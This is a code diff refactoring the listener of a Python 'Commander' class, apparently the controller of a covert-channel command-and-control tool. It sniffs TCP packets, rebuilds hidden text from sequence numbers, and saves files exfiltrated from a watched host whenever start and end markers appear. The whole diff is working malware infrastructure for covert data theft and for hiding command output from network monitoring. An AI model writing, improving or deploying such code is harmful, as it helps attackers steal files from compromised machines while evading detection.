@@ -114,59 +114,71 @@ class Commander:
 
     def start_output_listener(self):
         """Continuous sniffer for the RX port to print covert data."""
+
         self.output_buffer = ""
         self.watch_buffer = ""
         self.watch_receiving = False
         self.watch_current_file = None
         self.watch_file_size = 0
         self.watch_event_type = 0
-        
+
         def process_packet(pkt):
             if pkt.haslayer(TCP) and pkt[TCP].dport == self.rx_port:
+
                 char_code = pkt[TCP].seq % 256
-                if char_code != 0:
-                    char = chr(char_code)
-                    
-                    with self.output_lock:
-                        # ALWAYS add to watch buffer first to detect markers
-                        self.watch_buffer += char
-                        
-                        # Check for watch file START marker
-                        if "[WATCH FILE]" in self.watch_buffer and not self.watch_receiving:
+                if char_code == 0:
+                    return
+
+                char = chr(char_code)
+
+                with self.output_lock:
+
+                    # Always append to watch buffer for marker detection
+                    self.watch_buffer += char
+
+                    # Detect watch start
+                    if "[WATCH FILE]" in self.watch_buffer and not self.watch_receiving:
+                        match = re.search(r'\[WATCH FILE\] (.+?)\n', self.watch_buffer)
+                        if match:
                             self.watch_receiving = True
-                            match = re.search(r'\[WATCH FILE\] (.+?)\n', self.watch_buffer)
-                            if match:
-                                self.watch_current_file = match.group(1).strip()
-                        
-                        # Check for EVENT marker
-                        if "[EVENT]" in self.watch_buffer and self.watch_current_file:
-                            match = re.search(r'\[EVENT\] (\d+)\n', self.watch_buffer)
-                            if match:
-                                self.watch_event_type = int(match.group(1))
-                        
-                        # Check for SIZE marker
-                        if "[SIZE]" in self.watch_buffer and self.watch_current_file:
-                            match = re.search(r'\[SIZE\] (\d+)\n', self.watch_buffer)
-                            if match:
-                                self.watch_file_size = int(match.group(1))
-                        
-                        # Check for END marker - save and clear
-                        if "[WATCH END]" in self.watch_buffer and self.watch_receiving:
-                            self._save_watched_file()
-                            self.watch_receiving = False
-                            self.watch_current_file = None
-                            self.watch_buffer = ""
-                            self.watch_event_type = 0
-                        else:
-                            # Only add to output buffer if NOT receiving watch data
-                            if not self.watch_receiving:
-                                self.output_buffer += char
+                            self.watch_current_file = match.group(1).strip()
+
+                    # Detect event type
+                    if "[EVENT]" in self.watch_buffer:
+                        match = re.search(r'\[EVENT\] (\d+)\n', self.watch_buffer)
+                        if match:
+                            self.watch_event_type = int(match.group(1))
+
+                    # Detect size
+                    if "[SIZE]" in self.watch_buffer:
+                        match = re.search(r'\[SIZE\] (\d+)\n', self.watch_buffer)
+                        if match:
+                            self.watch_file_size = int(match.group(1))
+
+                    # Detect end of watcher transmission
+                    if "[WATCH END]" in self.watch_buffer and self.watch_receiving:
+
+                        self._save_watched_file()
+
+                        # Reset watch state
+                        self.watch_buffer = ""
+                        self.watch_receiving = False
+                        self.watch_current_file = None
+                        self.watch_event_type = 0
+                        self.watch_file_size = 0
+
+                        return
+
+                    # If not part of watcher traffic, treat as normal output
+                    if not self.watch_receiving:
+                        self.output_buffer += char
 
         try:
             sniff(
-                filter=f"tcp dst port {self.rx_port}", 
+                filter=f"tcp dst port {self.rx_port}",
                 prn=process_packet,
-                stop_filter=lambda x: not self.is_connected
+                stop_filter=lambda x: not self.is_connected,
+                store=0
             )
         except Exception as e:
             if self.is_connected:
@@ -182,6 +194,7 @@ class Commander:
 
     def _save_watched_file(self):
         """Save received watched file to ./watched/ folder with timestamp."""
+
         if not self.watch_current_file:
             return
 
@@ -189,8 +202,9 @@ class Commander:
         os.makedirs(watch_dir, exist_ok=True)
 
         ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-        rel_path = Path(self.watch_current_file)
-        snapshot_name = f"{rel_path.stem}_{ts}{rel_path.suffix}"
+        rel = Path(self.watch_current_file)
+
+        snapshot_name = f"{rel.stem}_{ts}{rel.suffix}"
         save_path = os.path.join(watch_dir, snapshot_name)
 
         content = self.watch_buffer
@@ -205,13 +219,12 @@ class Commander:
                 f.write(content)
 
             evt_name = self.EVT_NAMES.get(self.watch_event_type, "MODIFIED")
-            print(f"\n[+] Watched file saved: {save_path} ({evt_name})")
+
+            print(f"\n[WATCH EVENT] {evt_name}")
+            print(f"[+] Snapshot saved: {save_path}\n")
 
         except Exception as e:
             print(f"\n[!] Error saving watched file: {e}")
-
-        # Reset buffer to avoid corruption
-        self.watch_buffer = ""
 
     def display_output(self, timeout=3):
         """Wait for and display buffered output."""
